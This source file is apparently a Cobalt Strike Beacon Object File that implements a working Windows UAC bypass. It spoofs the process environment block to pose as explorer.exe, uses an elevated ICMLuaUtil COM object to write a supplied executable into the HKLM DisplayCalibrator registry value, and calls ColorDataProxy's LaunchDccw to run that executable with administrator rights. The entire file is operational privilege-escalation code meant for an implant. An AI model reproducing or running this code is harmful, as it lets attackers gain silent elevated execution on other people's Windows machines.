/* Exploits undocumented elevated COM interface ICMLuaUtil via process spoofing to edit registry
 then calls ColorDataProxy to trigger UAC bypass. Win 7 & up. */
// Source: https://github.com/hackerhouse-opensource/ColorDataProxyUACBypass
// x86_64-w64-mingw32-g++ -c ColorDataProxyBOF.cpp -w -o /share/test.o
#include <windows.h>
#include <commctrl.h>
#include <objbase.h>
#include <stdio.h>
#include <stdlib.h>
#include "ntos.h" // ntdll header
#include "ICMLuaUtil.h"
#include "IColorDataProxy.h"

extern "C" {

#include "beacon.h"

    void go(char * args, unsigned long length);

    // Added for ColorDataProxy UAC Bypass
    DECLSPEC_IMPORT     WINBASEAPI char * __cdecl MSVCRT$strcpy(char * __restrict__ __dst, const char * __restrict__ __src);
    DECLSPEC_IMPORT     WINBASEAPI void *__cdecl MSVCRT$malloc(size_t size);
    DECLSPEC_IMPORT     WINBASEAPI wchar_t *__cdecl MSVCRT$wcscpy(wchar_t * __restrict__ _Dest, const wchar_t * __restrict__ _Source);
    DECLSPEC_IMPORT     WINBASEAPI wchar_t *__cdecl MSVCRT$wcscat(wchar_t * __restrict__ _Dest,const wchar_t * __restrict__ _Source);
    DECLSPEC_IMPORT     WINBASEAPI int __cdecl MSVCRT$swprintf(wchar_t *__stream, const wchar_t *__format, ...);
    DECLSPEC_IMPORT     WINBASEAPI void __cdecl MSVCRT$free(void *_Memory);
    DECLSPEC_IMPORT     WINBASEAPI int WINAPI KERNEL32$MultiByteToWideChar(UINT CodePage, DWORD dwFlags, LPCCH lpMultiByteStr, int cbMultiByte, LPWSTR lpWideCharStr, int cchWideChar);
    DECLSPEC_IMPORT     NTSYSAPI VOID NTAPI NTDLL$RtlInitUnicodeString(PUNICODE_STRING DestinationString, PWSTR SourceString);
    DECLSPEC_IMPORT     NTSYSAPI VOID NTAPI NTDLL$RtlAcquirePebLock(VOID);
    DECLSPEC_IMPORT     NTSYSAPI VOID NTAPI NTDLL$RtlReleasePebLock(VOID);
    DECLSPEC_IMPORT     WINBASEAPI NTSTATUS NTAPI NTDLL$NtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID * BaseAddress, ULONG ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
    DECLSPEC_IMPORT     WINBASEAPI NTSTATUS NTAPI NTDLL$LdrEnumerateLoadedModules(BOOLEAN ReservedFlag, PLDR_LOADED_MODULE_ENUMERATION_CALLBACK_FUNCTION EnumProc, PVOID Context);
    DECLSPEC_IMPORT     WINBASEAPI int WINAPI OLE32$StringFromGUID2(REFGUID rguid, LPOLESTR lpsz, int cchMax);
    DECLSPEC_IMPORT     WINBASEAPI HRESULT WINAPI OLE32$CLSIDFromString(LPCOLESTR lpsz, LPCLSID pclsid);
    DECLSPEC_IMPORT     WINBASEAPI HRESULT WINAPI OLE32$IIDFromString(LPCOLESTR lpsz, LPIID lpiid);
    DECLSPEC_IMPORT     WINBASEAPI HRESULT WINAPI OLE32$CoInitialize(LPVOID pvReserved);
    DECLSPEC_IMPORT     WINBASEAPI HRESULT WINAPI KERNEL32$StringCchPrintfW(LPWSTR pszDest,size_t cchDest,LPCWSTR pszFormat,...);
    DECLSPEC_IMPORT     WINBASEAPI INT WINAPI KERNEL32$RtlZeroMemory(void *data, size_t size);
    DECLSPEC_IMPORT     WINBASEAPI HRESULT WINAPI OLE32$CoGetObject(wchar_t*, BIND_OPTS*, REFIID, void** ppv);
    DECLSPEC_IMPORT     WINBASEAPI HRESULT WINAPI OLE32$CoInitializeEx(LPVOID pvReserved, DWORD dwCoInit);
    DECLSPEC_IMPORT     WINBASEAPI HRESULT WINAPI OLE32$CoUninitialize(void);

}

// globals for callback and module
PWSTR ImageFileName = NULL;
PWSTR CommandLine = NULL;

// enumerate modules callback handler
VOID NTAPI LdrEnumModulesCallback(_In_ PCLDR_DATA_TABLE_ENTRY DataTableEntry, _In_ PVOID Context, _Inout_ BOOLEAN* StopEnumeration)
{
    //PPEB Peb = NtCurrentPeb();
    PPEB Peb = NtCurrentTeb()->ProcessEnvironmentBlock;
    SIZE_T      RegionSize = PAGE_SIZE;
    PWSTR FullDllName = ImageFileName;
    PWSTR BaseDllName = CommandLine;
    if (DataTableEntry->DllBase == Peb->ImageBaseAddress) {
        NTDLL$RtlInitUnicodeString(&DataTableEntry->FullDllName, FullDllName);
        NTDLL$RtlInitUnicodeString(&DataTableEntry->BaseDllName, BaseDllName);
        *StopEnumeration = TRUE;
    }
    else {
        *StopEnumeration = FALSE;
    }
}

HRESULT CoCreateInstanceAsAdmin(HWND hWnd, REFCLSID rclsid, REFIID riid, PVOID *ppVoid)
{
    BIND_OPTS3 bo;
    WCHAR wszCLSID[MAX_PATH] = { 0 };
    WCHAR wszMonikerName[MAX_PATH] = { 0 };

    KERNEL32$RtlZeroMemory(&bo, sizeof(bo));
    bo.cbStruct = sizeof(bo);
    bo.hwnd = hWnd;
    bo.dwClassContext = CLSCTX_LOCAL_SERVER;
    OLE32$StringFromGUID2(rclsid, wszCLSID, MAX_PATH);
    MSVCRT$swprintf(wszMonikerName, L"Elevation:Administrator!new:%s", wszCLSID);
    return OLE32$CoGetObject(wszMonikerName, (BIND_OPTS*)&bo, riid, ppVoid);
}

void go(char * args, unsigned long length)
{
    // get args
    datap parser;
    char *fileToRun = NULL;
    BeaconDataParse(&parser, args, length);
    fileToRun = BeaconDataExtract(&parser, NULL);

    // convert supplied exe to wchar_t pointer
    char targetEXE[MAX_PATH] = {0};
    MSVCRT$strcpy(targetEXE, fileToRun);
    wchar_t* pCMDpath =  (wchar_t*)MSVCRT$malloc(MAX_PATH);
    KERNEL32$MultiByteToWideChar(CP_UTF8, 0, targetEXE, -1, pCMDpath, MAX_PATH);

    NTSTATUS Status;
    SIZE_T RegionSize = PAGE_SIZE;
    BOOL bRestore = FALSE;
    HRESULT hRes = E_FAIL, hInit = E_FAIL;
    CLSID clsidCMLua = { 0 };
    CLSID clsidColorProxy = { 0 };
    IID iidCMLua = { 0 };
    IID iidColorProxy = { 0 };
    ICMLuaUtil* CMLuaUtil = NULL;
    IColorDataProxy* ColorDataProxy = NULL;
    PVOID ElevatedObject = NULL, ElevatedObject2 = NULL;
    //PPEB Peb = NtCurrentPeb();
    PPEB Peb = NtCurrentTeb()->ProcessEnvironmentBlock;
    NTDLL$RtlAcquirePebLock();
    Status = NTDLL$NtAllocateVirtualMemory(NtCurrentProcess(), (PVOID*)&ImageFileName, 0, &RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (NT_SUCCESS(Status)) {
        // should calculate these from the actual system root via environment
        MSVCRT$wcscpy(ImageFileName, L"c:\\Windows\\");
        MSVCRT$wcscat(ImageFileName, L"explorer.exe");
    }
    Status = NTDLL$NtAllocateVirtualMemory(NtCurrentProcess(), (PVOID*)&CommandLine, 0, &RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (NT_SUCCESS(Status)) {
        MSVCRT$wcscpy(CommandLine, L"explorer.exe");
    }
    NTDLL$RtlInitUnicodeString(&Peb->ProcessParameters->ImagePathName, ImageFileName);
    NTDLL$RtlInitUnicodeString(&Peb->ProcessParameters->CommandLine, CommandLine);
    NTDLL$LdrEnumerateLoadedModules(0, &LdrEnumModulesCallback, &bRestore);
    NTDLL$RtlReleasePebLock();
    // finished spoofing the PEB for elevated COM access
    BeaconPrintf(CALLBACK_OUTPUT, "Successfully spoofed PEB for explorer.exe\n");

    hInit = OLE32$CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    OLE32$CLSIDFromString(T_CLSID_CMSTPLUA, &clsidCMLua);
    OLE32$IIDFromString(T_IID_ICMLuaUtil, &iidCMLua);
    hRes = CoCreateInstanceAsAdmin(NULL, clsidCMLua, iidCMLua, &ElevatedObject);
    if (FAILED(hRes) || ElevatedObject == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to create elevated CMLuaUtil COM object (HRESULT: 0x%08lx)\n", hRes);
        MSVCRT$free(pCMDpath);
        if (hInit == S_OK) { OLE32$CoUninitialize(); }
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "Successfully created elevated CMLuaUtil COM object\n");
    CMLuaUtil = (ICMLuaUtil*)ElevatedObject;
    // set the payload into the registry key via privileged CMLuaUtil.
    hRes = CMLuaUtil->lpVtbl->SetRegistryStringValue(CMLuaUtil,HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows NT\\CurrentVersion\\ICM\\Calibration", L"DisplayCalibrator", pCMDpath);
    if (hRes == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "Successfully set DisplayCalibrator registry key to supplied exe\n");
    } else {
        BeaconPrintf(CALLBACK_ERROR, "Failed to set DisplayCalibrator registry key!\n");
        return;
    }
    OLE32$CLSIDFromString(T_CLSID_ColorDataProxy, &clsidColorProxy);
    OLE32$IIDFromString(T_IID_IColorDataProxy, &iidColorProxy);
    hRes = CoCreateInstanceAsAdmin(NULL, clsidColorProxy, iidColorProxy, &ElevatedObject2);
    if (FAILED(hRes) || ElevatedObject2 == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to create elevated IColorDataProxy COM object (HRESULT: 0x%08lx)\n", hRes);
        CMLuaUtil->lpVtbl->DeleteRegistryStringValue(CMLuaUtil, HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows NT\\CurrentVersion\\ICM\\Calibration", L"DisplayCalibrator");
        CMLuaUtil->lpVtbl->Release(CMLuaUtil);
        MSVCRT$free(pCMDpath);
        if (hInit == S_OK) { OLE32$CoUninitialize(); }
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "Successfully created elevated IColorDataProxy COM object\n");
    ColorDataProxy = (IColorDataProxy*)ElevatedObject2;
    BeaconPrintf(CALLBACK_OUTPUT, "Calling LaunchDccw method from the elevated IColorDataProxy COM object...\n");
    hRes = ColorDataProxy->lpVtbl->LaunchDccw(ColorDataProxy, 0);
    if (hRes == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "LaunchDccw executed successfully!\n");
    } else {
        BeaconPrintf(CALLBACK_ERROR, "LaunchDccw failed to execute!\n");
        return;
    }

    MSVCRT$free(pCMDpath);

    // delete the key & free the objects
    hRes = CMLuaUtil->lpVtbl->DeleteRegistryStringValue(CMLuaUtil, HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows NT\\CurrentVersion\\ICM\\Calibration", L"DisplayCalibrator");
    // clean up
    if (CMLuaUtil != NULL) {
        CMLuaUtil->lpVtbl->Release(CMLuaUtil);
    }
    if (ColorDataProxy != NULL) {
        ColorDataProxy->lpVtbl->Release(ColorDataProxy);
    }

    if (hInit == S_OK) {
        OLE32$CoUninitialize();
    }
    
    return;
}
